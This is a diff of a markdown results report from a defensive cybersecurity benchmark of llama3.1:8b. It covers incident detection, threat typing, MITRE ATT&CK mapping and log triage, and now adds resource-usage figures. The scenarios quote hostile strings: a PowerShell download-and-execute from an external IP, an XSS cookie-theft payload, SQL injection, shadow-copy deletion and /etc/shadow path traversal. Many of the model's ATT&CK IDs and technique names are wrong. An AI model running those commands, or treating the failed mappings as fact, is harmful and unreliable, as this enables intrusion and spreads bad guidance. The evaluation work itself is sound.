@@ -1,6 +1,6 @@
 # Cybersecurity benchmark — `llama3.1:8b`
 Model: `llama3.1:8b`
-Run started: 2026-05-06 01:07:01
+Run started: 2026-05-06 01:56:20
 
 ## Summary
 
@@ -13,46 +13,59 @@ Run started: 2026-05-06 01:07:01
 | Syslog triage (drain3) | 7 | 8 | 88% |
 | **Overall (with drain3)** | **23** | **32** | **72%** |
 
+## Resource usage
+
+Latency in seconds. GPU util/memory from `nvidia-smi`, CPU/RAM from `psutil`. Sampled every 250ms during each model call; peak is the max sample within the window.
+
+| Section | n | Total s | Avg s | p50 s | p95 s | Max s | Peak GPU% | Avg GPU% | Peak GPU MB | Peak CPU% | Avg CPU% | Peak RAM MB |
+|---|---|---|---|---|---|---|---|---|---|---|---|---|
+| Incident | 7 | 7.3 | 1.04 | 0.65 | 0.72 | 3.31 | 78% | 19% | 18557 | 52% | 12% | 32769 |
+| Threat | 7 | 6.0 | 0.85 | 0.89 | 0.90 | 0.91 | 81% | 35% | 18557 | 48% | 17% | 32763 |
+| MITRE | 10 | 7.4 | 0.74 | 0.72 | 0.88 | 0.93 | 81% | 57% | 18557 | 54% | 19% | 32769 |
+| Syslog (raw) | 8 | 5.5 | 0.69 | 0.68 | 0.76 | 0.88 | 81% | 35% | 18559 | 21% | 13% | 32660 |
+| Syslog (drain3) | 8 | 5.8 | 0.72 | 0.72 | 0.79 | 0.82 | 78% | 20% | 18559 | 33% | 14% | 32668 |
+| **Overall** | **40** | **31.9** | **0.80** | **0.72** | **0.91** | **3.31** | **81%** | **35%** | **18559** | **54%** | **15%** | **32769** |
+
 ## 1. Incident recognition (binary)
 
-### INC-1 — expected: **benign** — PASS (3.3s)
+### INC-1 — expected: **benign** — PASS (3.3s · GPU 5%/18549MB · CPU 52% · RAM 32525MB)
 _Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.
 
 _Reply_: Benign
 This is a routine login and initial activity, consistent with normal user behavior.
 
-### INC-2 — expected: **incident** — PASS (0.6s)
+### INC-2 — expected: **incident** — PASS (0.6s · GPU 5%/18557MB · CPU 14% · RAM 32584MB)
 _Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.
 
 _Reply_: Incident
 Unusual login and rapid RDP session establishment from an unknown location suggests potential unauthorized access or lateral movement.
 
-### INC-3 — expected: **incident** — PASS (0.6s)
+### INC-3 — expected: **incident** — PASS (0.6s · GPU 78%/18557MB · CPU 6% · RAM 32601MB)
 _Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.
 
 _Reply_: Incident
 This is likely an automated brute-force attack on the WordPress login page, attempting to gain unauthorized access to administrative accounts.
 
-### INC-4 — expected: **benign** — PASS (0.6s)
+### INC-4 — expected: **benign** — PASS (0.6s · GPU 78%/18557MB · CPU 15% · RAM 32664MB)
 _Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.
 
 _Reply_: Benign
 The job has run successfully for 30 consecutive nights, indicating a stable and expected process.
 
-### INC-5 — expected: **incident** — PASS (0.7s)
+### INC-5 — expected: **incident** — PASS (0.7s · GPU 0%/18557MB · CPU 22% · RAM 32747MB)
 _Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')
 
 _Reply_: Incident
 The execution of PowerShell code from an external URL via WinWord.exe suggests a potential lateral movement or malware delivery mechanism, warranting further investigation.
 
-### INC-6 — expected: **benign** — PASS (0.6s)
+### INC-6 — expected: **benign** — PASS (0.7s · GPU 16%/18557MB · CPU 29% · RAM 32760MB)
 _Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.
 
 _Reply_: Benign
 
 The developer's actions are routine and expected within the development process, and the passing of unit tests indicates that no immediate security vulnerabilities were introduced.
 
-### INC-7 — expected: **incident** — PASS (0.7s)
+### INC-7 — expected: **incident** — PASS (0.7s · GPU 16%/18557MB · CPU 14% · RAM 32769MB)
 _Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.
 
 _Reply_: Incident
@@ -60,7 +73,7 @@ This is likely an automated scanning or reconnaissance attempt by a malicious ac
 
 ## 2. Threat-type classification
 
-### THR-1 — accepted keywords: ['ransomware'] — PASS (0.7s)
+### THR-1 — accepted keywords: ['ransomware'] — PASS (0.8s · GPU 0%/18557MB · CPU 10% · RAM 32763MB)
 _Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.
 
 _Reply_: **LockBit Ransomware**
@@ -69,7 +82,7 @@ This is a type of ransomware that encrypts files and appends a ".lockbit" extens
 
 _Match_: 'ransomware'
 
-### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (0.8s)
+### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (0.8s · GPU 81%/18557MB · CPU 15% · RAM 32754MB)
 _Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.
 
 _Reply_: Phishing Attack
@@ -78,7 +91,7 @@ The email appears to be a phishing attempt because it's attempting to trick the 
 
 _Match_: 'phishing'
 
-### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (0.8s)
+### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (0.9s · GPU 81%/18557MB · CPU 48% · RAM 32743MB)
 _Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.
 
 _Reply_: SQL Injection (SI)
@@ -87,7 +100,7 @@ This is a classic example of SQL injection, where an attacker injects malicious 
 
 _Match_: 'sql injection'
 
-### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (0.8s)
+### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (0.8s · GPU 32%/18557MB · CPU 13% · RAM 32754MB)
 _Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.
 
 _Reply_: **Cross-Site Scripting (XSS)**
@@ -96,7 +109,7 @@ The attacker injects malicious JavaScript code into the web app's HTML body thro
 
 _Match_: 'xss'
 
-### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — PASS (0.8s)
+### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — PASS (0.9s · GPU 0%/18557MB · CPU 24% · RAM 32746MB)
 _Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.
 
 _Reply_: **Pass-the-Credential (PtC)**
@@ -105,7 +118,7 @@ This is a type of attack where an attacker injects malware into a legitimate pro
 
 _Match_: 'credential'
 
-### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (0.9s)
+### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (0.9s · GPU 74%/18557MB · CPU 44% · RAM 32756MB)
 _Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.
 
 _Reply_: Amplified DDoS Attack
@@ -114,7 +127,7 @@ This is a type of Distributed Denial-of-Service (DDoS) attack that leverages amp
 
 _Match_: 'ddos'
 
-### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — PASS (0.9s)
+### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — PASS (0.9s · GPU 74%/18557MB · CPU 25% · RAM 32730MB)
 _Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.
 
 _Reply_: Supply Chain Attack
@@ -140,7 +153,7 @@ _Match_: 'supply chain'
 | ATT-9 | A binary uses base64-encoded PowerShell with the -EncodedCommand fl... | `T1027, T1059.001, T1140` | `T1146.002` | FAIL |
 | ATT-10 | Attacker compresses sensitive files into a password-protected RAR a... | `T1560.001, T1560` | `T1022.003,T1036` | FAIL |
 
-### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — FAIL (0.7s)
+### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — FAIL (0.7s · GPU 69%/18557MB · CPU 27% · RAM 32743MB)
 _Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.
 
 _Reply_: T1194.003 - Exploit Public-Facing Application: Microsoft Office Malicious Macro
@@ -149,7 +162,7 @@ This technique involves exploiting a vulnerability in Microsoft Office, specific
 
 _Detected IDs_: T1194.003
 
-### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (0.9s)
+### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (0.9s · GPU 74%/18557MB · CPU 34% · RAM 32769MB)
 _Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.
 
 _Reply_: T1003.002 - Timestomp is not relevant here, but...
@@ -161,7 +174,7 @@ This technique involves extracting credentials from a system, which matches the 
 
 _Detected IDs_: T1003
 
-### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — FAIL (0.4s)
+### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — FAIL (0.5s · GPU 74%/18557MB · CPU 13% · RAM 32745MB)
 _Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.
 
 _Reply_: T1050.003 - Scheduled Task/Job
@@ -170,7 +183,7 @@ Scheduled Task Creation
 
 _Detected IDs_: T1050.003
 
-### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — PASS (0.7s)
+### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — PASS (0.7s · GPU 17%/18557MB · CPU 18% · RAM 32733MB)
 _Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.
 
 _Reply_: T1018 - Valid Accounts
@@ -179,7 +192,7 @@ The attacker is using built-in Windows tools to enumerate and identify valid dom
 
 _Detected IDs_: T1018
 
-### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — FAIL (1.0s)
+### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — FAIL (0.9s · GPU 68%/18557MB · CPU 19% · RAM 32753MB)
 _Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.
 
 _Reply_: T1060.002 - Registry Run Keys / Startup Folder 
@@ -188,7 +201,7 @@ This is a sub-technique of "Registry Run Keys / Startup" which involves adding o
 
 _Detected IDs_: T1060.002
 
-### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — FAIL (0.8s)
+### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — FAIL (0.7s · GPU 81%/18557MB · CPU 32% · RAM 32747MB)
 _Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.
 
 _Reply_: T1210 - Exploit Public-Facing Application
@@ -197,7 +210,7 @@ This technique involves using a public-facing application or service to exfiltra
 
 _Detected IDs_: T1210
 
-### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — FAIL (0.7s)
+### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — FAIL (0.7s · GPU 81%/18557MB · CPU 19% · RAM 32668MB)
 _Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.
 
 _Reply_: T1055.003 - Command and Control via Compromised Credentials 
@@ -206,7 +219,7 @@ This technique involves an attacker using compromised credentials to execute a c
 
 _Detected IDs_: T1055.003
 
-### ATT-8 — accepted IDs: ['T1490'] — FAIL (0.7s)
+### ATT-8 — accepted IDs: ['T1490'] — FAIL (0.7s · GPU 80%/18557MB · CPU 54% · RAM 32620MB)
 _Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.
 
 _Reply_: T1059.002 - System Shutdown/Reboot, specifically "Delete Volume Shadow Copies" 
@@ -215,7 +228,7 @@ This is a sub-technique of T1059, which is "System Shutdown/Reboot".
 
 _Detected IDs_: T1059.002,T1059
 
-### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — FAIL (0.9s)
+### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — FAIL (0.8s · GPU 80%/18557MB · CPU 23% · RAM 32610MB)
 _Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.
 
 _Reply_: T1146.002: Software Packing
@@ -224,7 +237,7 @@ This technique involves using a packing tool or method to obscure the true natur
 
 _Detected IDs_: T1146.002
 
-### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — FAIL (0.8s)
+### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — FAIL (0.8s · GPU 81%/18557MB · CPU 23% · RAM 32639MB)
 _Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.
 
 _Reply_: T1022.003 - File and Directory Permissions Modification, specifically for password-protected archives.
@@ -259,11 +272,11 @@ _drain3 templates_:
 [x1] Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
 ```
 
-**Baseline (raw only)** — PASS (0.8s)
+**Baseline (raw only)** — PASS (0.7s · GPU 81%/18557MB · CPU 19% · RAM 32660MB)
 _Reply_: Incident
 Multiple failed login attempts from the same IP address targeting common system users, followed by successful login and session creation for one of those users, suggests a potential brute-force attack or unauthorized access attempt.
 
-**With drain3 summary** — PASS (0.8s)
+**With drain3 summary** — PASS (0.8s · GPU 0%/18557MB · CPU 28% · RAM 32664MB)
 _Reply_: Incident
 The high count of [x6] for failed login attempts from 185.220.101.45 suggests a coordinated attack, while the single instance of a successful login and session opening for user ubuntu indicates potential exploitation of a vulnerability to gain access.
 
@@ -282,12 +295,12 @@ _drain3 templates_:
 [x1] Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
 ```
 
-**Baseline (raw only)** — PASS (0.9s)
+**Baseline (raw only)** — PASS (0.9s · GPU 81%/18557MB · CPU 12% · RAM 32638MB)
 _Reply_: Benign
 
 The log lines indicate a successful SSH login for the user "alice" from an IP address that is likely within the organization's network (10.0.4.22), and the session was opened by the root user, which suggests a legitimate administrative action.
 
-**With drain3 summary** — PASS (0.8s)
+**With drain3 summary** — PASS (0.7s · GPU 78%/18557MB · CPU 12% · RAM 32645MB)
 _Reply_: Benign
 
 The low [x1] count on all three templates suggests routine activity, and there is no indication of repeated failed logins, SQL/path-traversal probes, or other attack-shaped patterns.
@@ -307,12 +320,12 @@ _drain3 templates_:
 [x1] Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
 ```
 
-**Baseline (raw only)** — PASS (0.6s)
+**Baseline (raw only)** — PASS (0.5s · GPU 78%/18557MB · CPU 18% · RAM 32637MB)
 _Reply_: Benign
 
 The log lines appear to be normal system maintenance and cron job execution, indicating no malicious activity.
 
-**With drain3 summary** — PASS (0.7s)
+**With drain3 summary** — PASS (0.7s · GPU 0%/18559MB · CPU 30% · RAM 32627MB)
 _Reply_: Benign
 
 The low [x1] count on all three templates suggests routine maintenance activity, with no indication of repeated or anomalous behavior characteristic of an incident.
@@ -332,11 +345,11 @@ _drain3 templates_:
 [x1] 185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
 ```
 
-**Baseline (raw only)** — PASS (0.7s)
+**Baseline (raw only)** — PASS (0.7s · GPU 68%/18559MB · CPU 19% · RAM 32621MB)
 _Reply_: Incident
 The IP address 185.62.190.13 is attempting to exploit SQL injection vulnerabilities in the /products.php script, indicating malicious intent.
 
-**With drain3 summary** — PASS (0.8s)
+**With drain3 summary** — PASS (0.8s · GPU 68%/18559MB · CPU 18% · RAM 32630MB)
 _Reply_: Incident
 The high count of [x3] for the attack-shaped template, combined with a single instance of a specific malicious log line ([x1]), suggests a targeted and coordinated attack rather than routine activity.
 
@@ -359,11 +372,11 @@ _drain3 templates_:
 [x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
 ```
 
-**Baseline (raw only)** — PASS (0.6s)
+**Baseline (raw only)** — PASS (0.6s · GPU 0%/18559MB · CPU 21% · RAM 32650MB)
 _Reply_: Incident
 A non-privileged user (bob) is modifying the sudo group, potentially escalating their privileges and allowing unauthorized access to sensitive systems.
 
-**With drain3 summary** — FAIL (0.7s)
+**With drain3 summary** — FAIL (0.7s · GPU 0%/18559MB · CPU 33% · RAM 32656MB)
 _Reply_: Benign
 
 The high [x1] count on multiple templates suggests routine maintenance rather than an attack, as a single incident would likely produce more than one matching log line.
@@ -381,11 +394,11 @@ _drain3 templates_:
 [x3] 198.51.100.7 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
 ```
 
-**Baseline (raw only)** — PASS (0.7s)
+**Baseline (raw only)** — PASS (0.8s · GPU 0%/18559MB · CPU 18% · RAM 32644MB)
 _Reply_: Incident
 The IP address 198.51.100.7 is attempting to access sensitive system files (/etc/passwd, /etc/shadow, and /etc/hosts) through a web application, indicating potential unauthorized access attempts.
 
-**With drain3 summary** — PASS (0.7s)
+**With drain3 summary** — PASS (0.7s · GPU 0%/18559MB · CPU 18% · RAM 32626MB)
 _Reply_: Incident
 The high count of [x3] on an attack-shaped template, specifically the path-traversal probe attempt in the second log line, indicates a potential security incident.
 
@@ -402,12 +415,12 @@ _drain3 templates_:
 [x3] 10.0.4.22 - alice <*> +0000] <*> <*> HTTP/1.1" 200 <*> <*> "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
 ```
 
-**Baseline (raw only)** — PASS (0.6s)
+**Baseline (raw only)** — PASS (0.6s · GPU 0%/18559MB · CPU 16% · RAM 32621MB)
 _Reply_: Benign
 
 The user is accessing legitimate pages and making API calls to collect metrics, which appears to be normal system usage.
 
-**With drain3 summary** — PASS (0.6s)
+**With drain3 summary** — PASS (0.6s · GPU 43%/18559MB · CPU 20% · RAM 32644MB)
 _Reply_: Benign
 The high count of 3 matching log lines in the pattern summary suggests routine activity, not an incident.
 
@@ -428,10 +441,10 @@ _drain3 templates_:
 [x1] Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
 ```
 
-**Baseline (raw only)** — PASS (0.7s)
+**Baseline (raw only)** — PASS (0.7s · GPU 43%/18559MB · CPU 21% · RAM 32659MB)
 _Reply_: Incident
 The repeated failed login attempts from the same IP address and workstation name within a short time frame suggest a potential brute-force attack on the Administrator account.
 
-**With drain3 summary** — PASS (0.8s)
+**With drain3 summary** — PASS (0.8s · GPU 27%/18559MB · CPU 22% · RAM 32668MB)
 _Reply_: Incident
 The high count of 5 matching log lines for the failed login template (EventID=4625) suggests a potential security incident, whereas the single instance of a successful login (EventID=4624) is more indicative of routine activity.
